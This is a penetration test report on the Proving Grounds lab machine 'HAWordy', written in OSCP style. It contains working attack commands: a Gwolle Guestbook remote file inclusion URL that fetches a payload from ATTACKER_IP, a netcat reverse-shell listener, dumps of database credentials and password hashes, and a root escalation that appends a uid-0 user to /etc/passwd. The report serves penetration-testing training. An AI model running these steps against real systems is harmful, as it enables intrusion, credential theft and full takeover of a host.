# PG Practice HAWordy - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-5-19

---

## 1. Executive Summary

A penetration test was conducted against the target host “HAWordy” as part of a Proving Grounds Practice engagement. The assessment identified multiple vulnerabilities leading to full system compromise.

Initial access was achieved through a vulnerable WordPress plugin affected by a Remote File Inclusion vulnerability. This allowed remote code execution as the `www-data` user. Post-exploitation enumeration revealed a password-protected archive containing sensitive information and locally stored WordPress database credentials.

Privilege escalation to root was achieved through abuse of a writable `/etc/passwd` file, allowing creation of a new privileged user account.

The assessment demonstrated complete compromise of the target system and access to both user and root proof files.

---

## 2. Scope

- **Target:** 192.168.213.23
- **Environment:** PG Practice HAWordy
- **Testing Window:** 2026-5-18 to 2026-5-19
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

### TCP Port Enumeration

Command:

```
nmap -p- -sC -sV 192.168.213.23 -T4 -oA hawordy_tcp --open
```

Relevant Output:

```
80/tcp open  http Apache 2.4.29 Ubuntu
```

Interpretation:

The target exposed an Apache web server on TCP port 80.

### UDP Enumeration

Command:

```
nmap -sU -p53,69,123,137,138,161,2049,500 -sV 192.168.213.23
```

Relevant Output:

```
138/udp open|filtered netbios-dgm
```

Interpretation:

UDP enumeration identified NetBIOS-related services, though these did not contribute to the attack path.

---

## 5. Enumeration

### Web Enumeration

File brute forcing was performed against the web root.

Command:

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 http://192.168.213.23/FUZZ
```

Relevant Output:

```
info.php
```

Interpretation:

An exposed `info.php` file confirmed PHP support on the target.

### WordPress Discovery

Directory brute forcing identified a WordPress installation.

Command:

```
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 http://192.168.213.23/FUZZ/
```

Relevant Output:

```
wordpress
```

The WordPress site was accessible at:

```
http://192.168.213.23/wordpress/
```

### WordPress Enumeration

WPScan was used to enumerate plugins.

Command:

```
wpscan --url http://192.168.213.23/wordpress/ --plugins-detection mixed
```

Relevant Output:

```
gwolle-gb 1.5.3
mail-masta 1.0
reflex-gallery 3.1.3
site-editor 1.1.1
slideshow-gallery 1.4.6
wp-easycart 3.0.4
wp-support-plus-responsive-ticket-system 7.1.3
wp-symposium 15.1
```

Interpretation:

The `gwolle-gb` plugin version was vulnerable to Remote File Inclusion.

---

## 6. Initial Access

### Gwolle Guestbook Remote File Inclusion

The vulnerable `gwolle-gb` plugin was exploited using the `abspath` parameter to include a malicious PHP payload hosted on the attacker machine.

Attacker Setup:

```
python3 -m http.server 80
```

Exploit URL:

```
http://192.168.213.23/wordpress/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ATTACKER_IP/
```

Listener:

```
rlwrap nc -lnvp 443
```

Relevant Output:

```
Linux ubuntu 5.0.0-27-generic
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Interpretation:

Remote code execution was achieved as the `www-data` user.

### Basic Host Verification

Commands:

```
whoami

hostname

ip a
```

Relevant Output:

```
www-data
ubuntu
```

Interpretation:

Initial shell access was confirmed on the target host.

---

## 7. Post-Exploitation

### Sensitive File Discovery

Enumeration within the web root revealed a password-protected ZIP archive.

Command:

```
ls -lah /var/www/html
```

Relevant Output:

```
secret.zip
```

### Transfer Archive to Attacker Machine

The archive was encoded with base64 and reconstructed locally.

Commands:

```
cat secret.zip | base64 -w 0
```

```
echo 'BASE64_CONTENT' | base64 -d > secret.zip
```

Commands:

```
md5sum secret.zip

file secret.zip
```

Interpretation:

The archive was successfully transferred intact to the attacker machine.

### Crack ZIP Password

The ZIP hash was extracted and cracked using John and Hashcat.

Commands:

```
zip2john secret.zip > hash.txt

john hash.txt
```

Commands:

```
hashcat -m 17200 hash.txt -r /usr/share/hashcat/rules/best66.rule /usr/share/wordlists/rockyou.txt
```

Interpretation:

The ZIP archive password was not recovered.

### WordPress Configuration Enumeration

The WordPress configuration file was reviewed for database credentials.

Commands:

```
cd /var/www/html/wordpress

cat wp-config.php
```

Relevant Output:

```
DB_USER=raj
DB_PASSWORD=123
```

Interpretation:

Valid local MySQL credentials were identified.

### MySQL Enumeration

The recovered credentials were used to access the local database.

Commands:

```
mysql -uraj -p123

show databases;
```

Commands:

```
use wordpress;

select * from wp_users;
```

Relevant Output:

```
admin : $P$BYWgfD7pa572QS9YFoeVVmhrIhBAx0.
aarti : $P$BHyn.q5e5/HG9/UT/Ow3xkH2xXsikx0
```

Interpretation:

WordPress password hashes were extracted from the database but not cracked.

### Privilege Escalation Enumeration

SUID binaries were enumerated.

Command:

```
find / -perm -u=s -type f -ls 2>/dev/null
```

Interpretation:

Further enumeration identified the ability to modify `/etc/passwd` with SUID `cp` binary..

---

## 8. Privilege Escalation

### Create Privileged User Entry

A password hash was generated using OpenSSL.

Command:

```
openssl passwd -1 Password1
```

Relevant Output:

```
$1$4jkBhVAV$m4IR4g2bDdeW76iyn79vs0
```

A new root-level user was appended to `/etc/passwd`.

Command:

```
echo 'johnwick:$1$4jkBhVAV$m4IR4g2bDdeW76iyn79vs0:0:0:johnwick:/home/johnwick:/bin/bash' >> /etc/passwd
```

Command:

```
su johnwick
```

Relevant Output:

```
uid=0(root) gid=0(root) groups=0(root)
```

Interpretation:

Root privileges were obtained through modification of `/etc/passwd`.

---

## 9. Proof of Compromise

### User Proof

Command:

```
cat /home/raj/local.txt
```

**User Flag**: *REDACTED*

### Root Proof

Command:

```
cat /root/proof.txt
```

**Root Flag**: *REDACTED*

---

## 10. Findings & Recommendations

### Finding 1 - Vulnerable WordPress Plugin

**Severity:** Critical

**Description:**

The `gwolle-gb` WordPress plugin was vulnerable to Remote File Inclusion, allowing unauthenticated remote code execution.

**Impact:**

An attacker could execute arbitrary commands on the target server and gain shell access.

**Recommendation:**

Remove vulnerable plugins and maintain a strict patch management process for all WordPress components.

---

### Finding 2 - Sensitive Files Stored in Web Root

**Severity:** High

**Description:**

A password-protected archive containing sensitive information was stored within the web-accessible directory structure.

**Impact:**

Attackers obtaining local access could recover sensitive credentials and application data.

**Recommendation:**

Remove unnecessary archives from production systems and store backups outside the web root.

---

### Finding 3 - Writable /etc/passwd File

**Severity:** Critical

**Description:**

The `/etc/passwd` file was writable by a low-privileged user.

**Impact:**

An attacker could create a privileged account and gain full root access.

**Recommendation:**

Correct file permissions on system authentication files and audit privilege boundaries regularly.

---

## 11. Appendix

Gwolle Guestbook RFI Exploit -
[https://www.exploit-db.com/exploits/38861](https://www.exploit-db.com/exploits/38861)